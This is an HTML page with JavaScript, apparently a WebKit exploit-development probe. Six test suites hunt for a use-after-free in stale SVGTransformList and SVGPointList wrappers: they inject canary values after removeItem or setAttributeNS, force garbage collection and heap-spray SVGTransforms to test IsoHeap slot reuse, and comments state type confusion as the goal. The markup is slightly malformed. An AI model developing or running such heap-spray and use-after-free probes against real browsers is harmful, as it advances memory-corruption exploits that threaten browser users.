<!DOCTYPE html>
<html>
<head>

<title>SVG UAF v76 — SVGTransformList stale notification deep probe</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}

<body>
<h2>SVG UAF v76 — SVGTransformList stale TearOff: INJECTION TEST</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>

  <button onclick="runSuite('ADR109')">ADR109: setAttributeNS stale → does NEW attribute get contaminated?</button>
  <button onclick="runSuite('ADR110')">ADR110: SVGTransformList animVal TearOff — SMIL + removeItem stale survives?</button>
  <button onclick="runSuite('ADR111')">ADR111: SVGPointList setAttributeNS stale → attribute injection?</button>
  <button onclick="runSuite('ADR112')">ADR112: SVGTransformList — stale TearOff after GC pressure → IsoHeap slot reuse?</button>

<script>
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}return false;
};
var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){var d=document.getElementById('out');var p=document.createElement('pre');if(cls)p.className=cls;p.textContent=s;d.appendChild(p);d.scrollTop=d.scrollHeight;}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{navigator.clipboard.writeText(text).then(function(){toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}).catch(function(){fb(text,toast);});}catch(e){fb(text,toast);}
}
function fb(text,toast){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}document.body.removeChild(ta);}
function timeWrite(writeFn,label,ITER){
  ITER=ITER||500;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) writeFn(i);
  var t1=performance.now();
  var ms=(t1-t0).toFixed(2);
  var us=((t1-t0)*1000/ITER).toFixed(1);
  L(label+': '+ms+'ms ('+us+'µs/write)','info');
  return t1-t0;
}
function makeG(n,id){
  var svg=document.createElementNS(SVG_NS,'svg');
  if(id)svg.id=id;
  document.body.appendChild(svg);
  var g=document.createElementNS(SVG_NS,'g');
  var transforms=[];
  for(var i=0;i<n;i++) transforms.push('translate('+(i*10)+','+(i*5)+')');
  g.setAttribute('transform',transforms.join(' '));
  svg.appendChild(g);
  return{svg:svg,g:g};
}
var suites={};
function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');try{suites[name]();}catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}}
function runAll(){['ADR107','ADR108','ADR109','ADR110','ADR111','ADR112'].forEach(function(n){runSuite(n);});}

// ═══════════════════════════════════════════════════════════════
// ADR107 — SVGTransformList removeItem stale → getAttribute injection
//
// ADR101-E confirmed: after removeItem(0), TearOff T_E still fires
// a 1ms notification when T_E.setTranslate(x, y) is called.
//
// The KEY question: does the stale TearOff write INJECT data into
// the transform attribute? Specifically:
//
// Step 1: grab T_E = TL.getItem(0)
// Step 2: TL.removeItem(0) — list now has N-1 items
// Step 3: T_E.setTranslate(CANARY_X, CANARY_Y) — controlled values
// Step 4: read g.getAttribute('transform')
// Step 5: does CANARY_X/CANARY_Y appear in the attribute string?
//
// If YES: we can inject arbitrary transform data into the DOM!
// If YES: the element's transform matrix includes our controlled value!
//
// Further: if injection works, we can:
// - Write a transform that causes OOB in compositing
// - Use the injected value in SVGMatrix math
// - Chain with SMIL animation reading the mutated transform
//
// Also test: reading T_E.matrix.e/f AFTER stale write — does it
// reflect our written value (meaning the SVGTransform object itself
// stores our data)?
// ═══════════════════════════════════════════════════════════════
suites['ADR107']=function(){
  L('ADR107: removeItem stale write → does getAttribute() show injected value?','info');
  var N=10;
  var CANARY=99999;
  var o=makeG(N);
  var TL=o.g.transform.baseVal;
  var T_E=TL.getItem(0);

  // Read initial state
  var attrBefore=o.g.getAttribute('transform');
  L('ADR107: attr BEFORE removeItem: '+attrBefore.substring(0,80),'info');

  // removeItem
  TL.removeItem(0);
  var attrAfterRemove=o.g.getAttribute('transform');
  L('ADR107: attr AFTER removeItem: '+attrAfterRemove.substring(0,80),'info');
  L('ADR107: list length after removeItem: '+TL.numberOfItems,'info');

  // One stale write with canary value
  T_E.setTranslate(CANARY, CANARY*2);

  // Check T_E.matrix.e after write (is the value stored in the SVGTransform?)
  var storedTx=T_E.matrix.e;
  var storedTy=T_E.matrix.f;
  L('ADR107: T_E.matrix.e='+storedTx+' .f='+storedTy+' (expected '+CANARY+','+(CANARY*2)+')','info');
  if(Math.abs(storedTx-CANARY)<1){
    L('ADR107: ★ T_E.matrix.e = CANARY! Write stored in SVGTransform object.','hit');
  }

  // Check if getAttribute changed
  var attrAfterStale=o.g.getAttribute('transform');
  L('ADR107: attr AFTER stale write: '+attrAfterStale.substring(0,120),'info');

  // Does the attribute contain CANARY?
  if(attrAfterStale.indexOf(String(CANARY))!==-1){
    L('★★★ ADR107: CANARY VALUE INJECTED INTO ATTRIBUTE! attr contains '+CANARY,'hit');
    L('ADR107: FULL INJECTED ATTR: '+attrAfterStale,'hit');
  } else {
    L('ADR107: No CANARY in attribute. Stale write did not inject into attr.','info');
  }

  // Check the SVGTransformList items — did a new item appear?
  L('ADR107: list items after stale write:','info');
  for(var i=0;i<TL.numberOfItems;i++){
    var t=TL.getItem(i);
    L('  item['+i+']: tx='+t.matrix.e.toFixed(2)+' ty='+t.matrix.f.toFixed(2),'info');
  }

  // Did the element's computed transform change?
  var ctm=o.g.getScreenCTM();
  if(ctm){
    L('ADR107: element CTM.e='+ctm.e.toFixed(2)+' .f='+ctm.f.toFixed(2),'info');
    if(Math.abs(ctm.e-CANARY)<100||Math.abs(ctm.f-CANARY*2)<100){
      L('★★★ ADR107: CTM CONTAINS CANARY! Element transform was affected!','hit');
    }
  }

  // Multiple stale writes — exhaustive
  var ITER=500;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) T_E.setTranslate(i*0.1+CANARY, i*0.2);
  var t1=performance.now();
  L('ADR107: 500 stale writes: '+(t1-t0).toFixed(2)+'ms (CONFIRM: '+(t1-t0>0.5?'★ALIVE':'dead')+')','info');

  var attrFinal=o.g.getAttribute('transform');
  L('ADR107: attr AFTER 500 stale writes: '+attrFinal.substring(0,120),'info');
  if(attrFinal!==attrAfterRemove){
    L('★★★ ADR107: ATTRIBUTE CHANGED BY STALE WRITES!','hit');
    L('ADR107: changed from: '+attrAfterRemove.substring(0,60),'warn');
    L('ADR107:      changed to: '+attrFinal.substring(0,60),'warn');
  }

  o.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR108 — MutationObserver + SVGMatrix controlled injection
//
// If the attribute changes, MutationObserver fires. We use this to:
// 1. Confirm the exact moment of attribute mutation
// 2. Measure how many stale writes it takes to trigger mutation
// 3. Get the exact injected value
//
// Also: SVGTransform.setMatrix(SVGMatrix) — allows setting full
// 6-float matrix at once. More control than setTranslate.
// setMatrix(m) with m.a=TARGET_VALUE — does the 'a' value inject?
//
// Additionally: test with EXTREME float values:
// T_E.setMatrix({a:1e38, b:0, c:0, d:1, e:0, f:0})
// Does SVGMatrix accept extreme values? Does serialization overflow?
// ═══════════════════════════════════════════════════════════════
suites['ADR108']=function(){
  L('ADR108: MutationObserver + SVGMatrix controlled injection','info');
  var N=10;
  var o=makeG(N);
  var TL=o.g.transform.baseVal;
  var T_E=TL.getItem(0);

  // Set up MutationObserver BEFORE removeItem
  var mutations=[];
  var mo=new MutationObserver(function(recs){
    recs.forEach(function(r){
      mutations.push({
        old:r.oldValue,
        new:o.g.getAttribute('transform')
      });
    });
  });
  mo.observe(o.g,{attributes:true,attributeFilter:['transform'],attributeOldValue:true});

  // removeItem(0)
  TL.removeItem(0);
  var moCountAfterRemove=mutations.length;
  L('ADR108: MO fires from removeItem: '+moCountAfterRemove,'info');

  // Single stale write via setMatrix
  var svg_matrix=o.svg.createSVGMatrix();
  // setMatrix with controlled values (a, b, c, d = identity, e, f = translation)
  // matrix.e = tx, matrix.f = ty
  svg_matrix.e=123456.789;
  svg_matrix.f=654321.0;
  T_E.setMatrix(svg_matrix);
  var moCountAfterMatrix=mutations.length;
  L('ADR108: MO fires from stale setMatrix: '+(moCountAfterMatrix-moCountAfterRemove),'info');
  if(moCountAfterMatrix>moCountAfterRemove){
    L('★★★ ADR108: MutationObserver FIRED from stale setMatrix!','hit');
    mutations.slice(moCountAfterRemove).forEach(function(m,i){
      L('  MO mutation '+i+': attr='+m.new.substring(0,80),'hit');
    });
  }

  var attrAfterMatrix=o.g.getAttribute('transform');
  L('ADR108: attr after stale setMatrix: '+attrAfterMatrix.substring(0,120),'info');
  if(attrAfterMatrix.indexOf('123456')!==-1){
    L('★★★ ADR108: INJECTED 123456! Matrix value in attribute!','hit');
  }

  // Extreme values
  var svg_matrix2=o.svg.createSVGMatrix();
  svg_matrix2.a=1e38;
  svg_matrix2.d=1e38;
  svg_matrix2.e=1e38;
  svg_matrix2.f=1e38;
  try{
    T_E.setMatrix(svg_matrix2);
    var attrExtreme=o.g.getAttribute('transform');
    L('ADR108: attr after extreme matrix: '+attrExtreme.substring(0,120),'info');
    if(attrExtreme.indexOf('e+38')!==-1||attrExtreme.indexOf('Inf')!==-1||attrExtreme.indexOf('NaN')!==-1){
      L('★★★ ADR108: EXTREME VALUES IN ATTRIBUTE!','hit');
    }
  }catch(e){L('ADR108: setMatrix extreme threw: '+e.message,'warn');}

  // setRotate with controlled angle, cx, cy
  // SVGTransform.setRotate(angle, cx, cy) — 3 parameters
  // If angle is injected, we can potentially control rotation math
  try{
    T_E.setRotate(987654.321, 111111, 222222);
    var attrRotate=o.g.getAttribute('transform');
    L('ADR108: attr after stale setRotate: '+attrRotate.substring(0,120),'info');
    if(attrRotate.indexOf('987654')!==-1){
      L('★★★ ADR108: INJECTED rotation angle 987654 into attribute!','hit');
    }
  }catch(e){L('ADR108: setRotate threw: '+e.message,'warn');}

  // setScale, setSkewX, setSkewY
  try{
    T_E.setScale(55555, 66666);
    var attrScale=o.g.getAttribute('transform');
    L('ADR108: attr after stale setScale: '+attrScale.substring(0,120),'info');
  }catch(e){L('ADR108: setScale threw: '+e.message,'warn');}

  L('ADR108: total MO mutations: '+mutations.length,'info');
  mo.disconnect();
  o.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR109 — setAttributeNS stale → does NEW attribute get contaminated?
//
// ADR101-A confirmed: setAttributeNS → stale TearOff ALIVE (1ms).
//
// Scenario:
// 1. Grab T_A = TL.getItem(0) on 10-item list
// 2. g.setAttributeNS(null, 'transform', 'scale(2)') — NEW list (1 item)
// 3. T_A.setTranslate(CANARY, CANARY) — stale write → notification fires
// 4. What does getAttribute() return?
//    a) 'scale(2)' — unaffected (stale write went nowhere useful)
//    b) 'scale(2) translate(CANARY, CANARY)' — INJECTION!
//    c) Something else entirely (C++ memory corruption visible)
//
// This is KEY: if setting new attribute creates a NEW SVGTransformList
// object but T_A's TearOff still has a raw pointer to the OLD list,
// writing T_A fires a notification through the OLD list → the OLD list
// notifies the element → element might use OLD list data for setAttribute.
//
// This would be a classic use-after-"attribution" bug.
//
// Also test: what does TL (JS ref to baseVal) say after setAttributeNS?
// Does TL.numberOfItems reflect the new attribute (1) or the old (10)?
// ═══════════════════════════════════════════════════════════════
suites['ADR109']=function(){
  L('ADR109: setAttributeNS stale TearOff → new attribute contamination?','info');
  var N=10;
  var CANARY=77777;
  var o=makeG(N);
  var TL_old=o.g.transform.baseVal;// reference to ORIGINAL list
  var T_A=TL_old.getItem(0);// T_A wraps old list item[0]

  L('ADR109: initial attr: '+o.g.getAttribute('transform').substring(0,80),'info');
  L('ADR109: TL_old.numberOfItems='+TL_old.numberOfItems,'info');

  // Change the attribute entirely
  o.g.setAttributeNS(null,'transform','scale(2)');
  var attrNew=o.g.getAttribute('transform');
  L('ADR109: attr after setAttributeNS: '+attrNew,'info');

  // What does TL_old say now? Does it reflect new attr?
  var TL_new=o.g.transform.baseVal;// fresh ref
  L('ADR109: TL_old.numberOfItems after setAttr: '+TL_old.numberOfItems,'info');
  L('ADR109: TL_new.numberOfItems: '+TL_new.numberOfItems,'info');
  if(TL_old.numberOfItems!==TL_new.numberOfItems){
    L('ADR109: ★ TL_old and TL_new have DIFFERENT item counts! Old list is stale!','hit');
    L('ADR109: OLD list has '+TL_old.numberOfItems+' items, NEW list has '+TL_new.numberOfItems,'hit');
  }

  // T_A write → does it hit old or new list?
  // Write canary
  T_A.setTranslate(CANARY, CANARY*2);
  var attrAfterStale=o.g.getAttribute('transform');
  L('ADR109: attr after stale setTranslate: '+attrAfterStale,'info');

  if(attrAfterStale.indexOf(String(CANARY))!==-1){
    L('★★★ ADR109: CANARY INJECTED into new attribute! '+attrAfterStale,'hit');
  } else if(attrAfterStale!==attrNew){
    L('★★★ ADR109: Attribute CHANGED by stale write (different from post-setAttr)!','hit');
    L('ADR109: was: '+attrNew,'warn');
    L('ADR109: now: '+attrAfterStale,'warn');
  } else {
    L('ADR109: attr unchanged by stale write. ('+attrAfterStale+')','info');
  }

  // Check what TL_old items say now
  L('ADR109: TL_old items after stale write:','info');
  try{
    for(var i=0;i<TL_old.numberOfItems;i++){
      var t=TL_old.getItem(i);
      L('  TL_old['+i+']: tx='+t.matrix.e.toFixed(2)+' ty='+t.matrix.f.toFixed(2),'info');
    }
  }catch(e){L('ADR109: TL_old.getItem threw: '+e.message,'warn');}

  // MO test for this scenario
  var mutations109=[];
  var mo109=new MutationObserver(function(recs){
    recs.forEach(function(r){mutations109.push(o.g.getAttribute('transform'));});
  });
  // Reset: fresh g element
  var o2=makeG(N);
  var TL2=o2.g.transform.baseVal;
  var T2=TL2.getItem(0);
  mo109.observe(o2.g,{attributes:true,attributeFilter:['transform']});
  o2.g.setAttributeNS(null,'transform','rotate(45)');
  var mutsAfterSetAttr=mutations109.length;
  L('ADR109: MO fires from setAttributeNS: '+mutsAfterSetAttr,'info');
  // Now stale write
  T2.setTranslate(CANARY, CANARY);
  var mutsAfterStale=mutations109.length;
  L('ADR109: MO fires from stale setTranslate: '+(mutsAfterStale-mutsAfterSetAttr),'info');
  if(mutsAfterStale>mutsAfterSetAttr){
    L('★★★ ADR109: MO FIRED from stale write after setAttributeNS!','hit');
    L('ADR109: attr at that moment: '+mutations109[mutations109.length-1],'hit');
  }
  var t0=performance.now();
  for(var j=0;j<500;j++) T2.setTranslate(j+CANARY, j);
  var t1=performance.now();
  L('ADR109: 500 stale writes after setAttr: '+(t1-t0).toFixed(2)+'ms','info');
  mo109.disconnect();
  o.svg.remove();
  o2.svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR110 — SVGTransformList animVal TearOff after SMIL + removeItem
//
// For SVGNumberList:
// - animVal TearOff = read-only (throw on animVal.removeItem)
// - animVal TearOff context nulled on anim.remove(), to= change, etc.
//
// For SVGTransformList with SMIL animateTransform:
// - Does animVal have the same read-only restriction?
// - After removeItem from BASEVAL, does the animVal TearOff survive?
// - Can we grab animVal TearOff during animation and write to it after anim ends?
//
// SVGTransformList has additive animation. The animVal might be a
// computed combination of baseVal + animation offset. Removing from
// baseVal and writing to animVal TearOff might cause:
// - OOB in the additive computation
// - Stale animVal that refs freed baseVal data
//
// Plan:
// 1. Create g with 5 translate transforms
// 2. Add animateTransform (type=translate, additive=sum)
// 3. Grab T_av = animVal.getItem(4) during animation
// 4. removeItem(4) from baseVal → baseVal shrinks to 4 items
// 5. Check T_av.matrix.e — does it still read from animVal[4]?
// 6. Time T_av writes — does animVal TearOff survive after baseVal removeItem?
// ═══════════════════════════════════════════════════════════════
suites['ADR110']=function(){
  L('ADR110: SVGTransformList animVal TearOff — SMIL + baseVal removeItem','info');
  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
  var g=document.createElementNS(SVG_NS,'g');
  g.setAttribute('transform','translate(100,0) translate(200,0) translate(300,0) translate(400,0) translate(500,0)');
  svg.appendChild(g);
  var anim=document.createElementNS(SVG_NS,'animateTransform');
  anim.setAttribute('attributeName','transform');
  anim.setAttribute('type','translate');
  anim.setAttribute('from','0,0');
  anim.setAttribute('to','1000,0');
  anim.setAttribute('dur','10s');
  anim.setAttribute('repeatCount','indefinite');
  anim.setAttribute('additive','sum');
  g.appendChild(anim);

  var T_av4=null, T_bv4=null;
  var frame=0;
  function tick(){
    var bvN=g.transform.baseVal.numberOfItems;
    var avN=g.transform.animVal.numberOfItems;
    if(frame===1){
      // Grab animVal[4] and baseVal[4] during animation
      T_av4=g.transform.animVal.getItem(avN-1);
      T_bv4=g.transform.baseVal.getItem(bvN-1);
      L('ADR110 f1: bv='+bvN+' av='+avN,'info');
      L('ADR110 f1: T_av4.tx='+T_av4.matrix.e.toFixed(2)+' T_bv4.tx='+T_bv4.matrix.e.toFixed(2),'info');
    }
    if(frame===2){
      // Remove last item from baseVal
      g.transform.baseVal.removeItem(bvN-1);
      var newBvN=g.transform.baseVal.numberOfItems;
      var newAvN=g.transform.animVal.numberOfItems;
      L('ADR110 f2: after removeItem(last): bv='+newBvN+' av='+newAvN,'info');
    }
    if(frame===3){
      // Read T_av4 and T_bv4 — are they still accessible?
      L('ADR110 f3: T_av4.tx='+T_av4.matrix.e.toFixed(2),'info');
      L('ADR110 f3: T_bv4.tx='+T_bv4.matrix.e.toFixed(2),'info');
      // Time stale writes
      var t0=performance.now();
      for(var i=0;i<500;i++) T_av4.setTranslate(i+99999, 0);
      var t1=performance.now();
      L('ADR110 f3: T_av4 stale write: '+(t1-t0).toFixed(2)+'ms ('+((t1-t0)>0.5?'★ALIVE':'dead')+')','info');
      var t2=performance.now();
      for(var i=0;i<500;i++) T_bv4.setTranslate(i+88888, 0);
      var t3=performance.now();
      L('ADR110 f3: T_bv4 stale write: '+(t3-t2).toFixed(2)+'ms ('+((t3-t2)>0.5?'★ALIVE':'dead')+')','info');
      // Check: did our stale write to T_av4 affect animVal list?
      var avN3=g.transform.animVal.numberOfItems;
      L('ADR110 f3: animVal length after stale writes: '+avN3,'info');
      for(var i=0;i<avN3;i++){
        var t=g.transform.animVal.getItem(i);
        L('  animVal['+i+'] tx='+t.matrix.e.toFixed(2),'info');
      }
    }
    if(frame===4){
      L('ADR110 f4: T_av4.tx after all stale writes='+T_av4.matrix.e.toFixed(2),'info');
      // Check attr
      L('ADR110 f4: getAttribute: '+g.getAttribute('transform').substring(0,80),'info');
    }
    frame++;
    if(frame<6) requestAnimationFrame(tick);
    else svg.remove();
  }
  requestAnimationFrame(tick);
};

// ═══════════════════════════════════════════════════════════════
// ADR111 — SVGPointList setAttributeNS stale → attribute injection
//
// ADR102-A confirmed: setAttributeNS on polygon → SVGPoint TearOff ALIVE (1ms).
// But ADR102-D: removeItem → SVGPoint dead (0ms). Different from SVGTransformList.
//
// So for SVGPointList:
// - setAttributeNS → TearOff ALIVE
// - removeItem → TearOff dead
//
// The setAttributeNS case: after setting new points attribute,
// does the stale SVGPoint write inject into the new attribute?
//
// Test: exactly like ADR109 but for SVGPointList.
// ═══════════════════════════════════════════════════════════════
suites['ADR111']=function(){
  L('ADR111: SVGPointList setAttributeNS stale → attribute injection?','info');
  var N=10;
  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
  var poly=document.createElementNS(SVG_NS,'polygon');
  var pts=[];
  for(var i=0;i<N;i++) pts.push((i*10)+','+(i*5));
  poly.setAttribute('points',pts.join(' '));
  svg.appendChild(poly);

  var PL=poly.points;
  var P_A=PL.getItem(0);
  L('ADR111: initial: '+poly.getAttribute('points').substring(0,60),'info');
  L('ADR111: P_A = ('+P_A.x+','+P_A.y+')','info');

  // Set new points attribute
  poly.setAttributeNS(null,'points','100,200 300,400');
  L('ADR111: after setAttr: '+poly.getAttribute('points'),'info');
  var PL_new=poly.points;
  L('ADR111: PL.numberOfItems after setAttr: '+PL.numberOfItems,'info');
  L('ADR111: PL_new.numberOfItems: '+PL_new.numberOfItems,'info');

  // Stale write via P_A
  var CANARY=55555;
  P_A.x=CANARY;
  P_A.y=CANARY*2;
  var attrAfterStale=poly.getAttribute('points');
  L('ADR111: attr after stale P_A.x/y write: '+attrAfterStale,'info');
  if(attrAfterStale.indexOf(String(CANARY))!==-1){
    L('★★★ ADR111: CANARY INJECTED into points attribute!','hit');
  }

  // Time the stale write
  var t0=performance.now();
  for(var i=0;i<500;i++){P_A.x=i+CANARY;P_A.y=i;}
  var t1=performance.now();
  L('ADR111: 500 stale writes: '+(t1-t0).toFixed(2)+'ms ('+((t1-t0)>0.5?'★ALIVE':'dead')+')','info');

  // Final attr check
  L('ADR111: final attr: '+poly.getAttribute('points'),'info');
  svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR112 — SVGTransformList: IsoHeap slot reuse test
//
// For SVGNumberList on iOS 26.5.2, IsoHeap is bump-only — freed slots
// are permanently dead. v70 confirmed this.
//
// SVGTransform is a LARGER object than SVGNumber (6 floats vs 1).
// It may be in a different IsoHeap class (different size bucket).
// Does SVGTransform's IsoHeap ALSO use bump-only allocation?
//
// If NOT bump-only: freed SVGTransform slots can be reused!
// This would mean after removeItem(0), if T_E holds the last ref to T0
// and we release T_E, T0's IsoHeap slot becomes available.
// We could then allocate a new SVGTransform that lands in that slot,
// while any OTHER TearOff that still refs T0 (an aliased TearOff)
// would now read our new SVGTransform's data. CLASSIC TYPE CONFUSION.
//
// Test:
// 1. Create N SVGTransformLists, each with K transforms
// 2. Grab TearOffs for ALL items
// 3. removeItem + release TearOff from all lists → frees N*K SVGTransform slots
// 4. Create new SVGTransformLists (sprays new SVGTransforms)
// 5. Check stale TearOffs from step 2 — do any show data from the NEW sprays?
//
// Also test: createSVGTransform() → is this in the same IsoHeap class?
// SVGSVGElement.createSVGTransform() creates a standalone SVGTransform.
// If standalone and list-held SVGTransforms share the same IsoHeap class:
// freed list slots can be reused by createSVGTransform() calls.
// ═══════════════════════════════════════════════════════════════
suites['ADR112']=function(){
  L('ADR112: SVGTransformList IsoHeap slot reuse test','info');
  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
  var LISTS=50;
  var K=10;// transforms per list

  // Phase 1: Create LISTS lists, grab ALL TearOffs
  var lists=[];
  var tearoffs=[];
  for(var l=0;l<LISTS;l++){
    var g=document.createElementNS(SVG_NS,'g');
    var transforms=[];
    for(var k=0;k<K;k++) transforms.push('translate('+(l*1000+k*10)+','+(l*100+k)+')');
    g.setAttribute('transform',transforms.join(' '));
    svg.appendChild(g);
    var TL=g.transform.baseVal;
    var row=[];
    for(var k=0;k<K;k++) row.push(TL.getItem(k));
    lists.push({g:g,TL:TL});
    tearoffs.push(row);
  }
  L('ADR112: created '+LISTS+' lists × '+K+' items = '+(LISTS*K)+' TearOffs','info');

  // Phase 2: removeItem ALL items from all lists → free SVGTransform refs from vectors
  // TearOffs still hold a ref → SVGTransforms NOT freed yet
  for(var l=0;l<LISTS;l++){
    var TL=lists[l].TL;
    for(var k=K-1;k>=0;k--){
      try{TL.removeItem(k);}catch(e){}
    }
  }
  L('ADR112: removeItem done. All lists now empty (items removed from vectors).','info');

  // Phase 3: Release TearOffs → SVGTransform refcount drops to 0 → FREED
  // We release by overwriting the tearoffs array
  // Keep ONE TearOff (tearoffs[0][0]) to check for contamination later
  var sentinel=tearoffs[0][0];
  var sentinelOrigTx=sentinel.matrix.e;
  L('ADR112: sentinel = tearoffs[0][0], original tx='+sentinelOrigTx,'info');

  // Release all TearOffs except sentinel
  for(var l=0;l<LISTS;l++){
    for(var k=0;k<K;k++){
      if(!(l===0&&k===0)) tearoffs[l][k]=null;
    }
  }
  tearoffs=null;

  // Force GC
  try{
    if(window.gc) window.gc();
    var gcArr=[];
    for(var i=0;i<100000;i++) gcArr.push(new Uint32Array(128));
    gcArr=null;
    if(window.gc) window.gc();
  }catch(e){}
  L('ADR112: GC pressure applied. SVGTransform slots should be freed.','info');

  // Phase 4: Spray new SVGTransforms
  // Use createSVGTransform() to allocate new SVGTransform objects
  // These MIGHT land in the freed IsoHeap slots
  var SPRAY_N=LISTS*K*2;
  var spray=[];
  var SPRAY_CANARY=0xDEAD;// decimal: 57005
  for(var i=0;i<SPRAY_N;i++){
    var t=svg.createSVGTransform();
    t.setTranslate(SPRAY_CANARY+i, SPRAY_CANARY*2+i);
    spray.push(t);
  }
  L('ADR112: sprayed '+SPRAY_N+' new SVGTransforms via createSVGTransform()','info');

  // Phase 5: Check sentinel — does it show spray canary data?
  var sentinelPostTx=sentinel.matrix.e;
  var sentinelPostTy=sentinel.matrix.f;
  L('ADR112: sentinel after spray: tx='+sentinelPostTx.toFixed(2)+' ty='+sentinelPostTy.toFixed(2),'info');
  L('ADR112: sentinel original:    tx='+sentinelOrigTx.toFixed(2),'info');
  if(Math.abs(sentinelPostTx-sentinelOrigTx)>1){
    L('★★★ ADR112: SENTINEL CHANGED! IsoHeap slot was REUSED!','hit');
    L('ADR112: new tx='+sentinelPostTx+' (spray canary range: '+SPRAY_CANARY+'-'+(SPRAY_CANARY+SPRAY_N)+')','hit');
    var isSprayCanary=sentinelPostTx>=SPRAY_CANARY&&sentinelPostTx<=SPRAY_CANARY+SPRAY_N;
    if(isSprayCanary){
      L('★★★ ADR112: Sentinel reads SPRAY DATA → TYPE CONFUSION / UAF via slot reuse!','hit');
    }
  } else {
    L('ADR112: sentinel unchanged. IsoHeap is bump-only for SVGTransform too.','info');
  }

  // Also: time stale writes on sentinel
  var t0=performance.now();
  for(var i=0;i<500;i++) sentinel.setTranslate(i,i);
  var t1=performance.now();
  L('ADR112: sentinel stale write timing: '+(t1-t0).toFixed(2)+'ms','info');

  // Phase 6: Spray via insertItemBefore (list-allocated SVGTransform)
  // createSVGTransform might be a different allocation path than list items
  var g2=document.createElementNS(SVG_NS,'g');
  g2.setAttribute('transform','translate(0,0)');
  svg.appendChild(g2);
  var TL2=g2.transform.baseVal;
  var sentinel2=TL2.getItem(0);
  var sent2Orig=sentinel2.matrix.e;
  L('ADR112: sentinel2 = list-allocated SVGTransform, orig tx='+sent2Orig,'info');
  TL2.removeItem(0);// remove from list (slot freed when sentinel2 released)

  // Now re-spray via list insertions
  var SPRAY2_CANARY=0xBEEF;// 48879
  for(var i=0;i<LISTS;i++){
    var g3=document.createElementNS(SVG_NS,'g');
    g3.setAttribute('transform','translate('+(SPRAY2_CANARY+i)+',0)');
    svg.appendChild(g3);
  }
  L('ADR112: re-sprayed '+LISTS+' list SVGTransforms with canary '+SPRAY2_CANARY,'info');

  var sent2Post=sentinel2.matrix.e;
  L('ADR112: sentinel2 after spray: tx='+sent2Post.toFixed(2),'info');
  if(Math.abs(sent2Post-sent2Orig)>1){
    L('★★★ ADR112: SENTINEL2 CHANGED! List-SVGTransform IsoHeap reused!','hit');
  } else {
    L('ADR112: sentinel2 unchanged. List SVGTransform IsoHeap also bump-only.','info');
  }

  svg.remove();
  L('ADR112: done.','info');
};
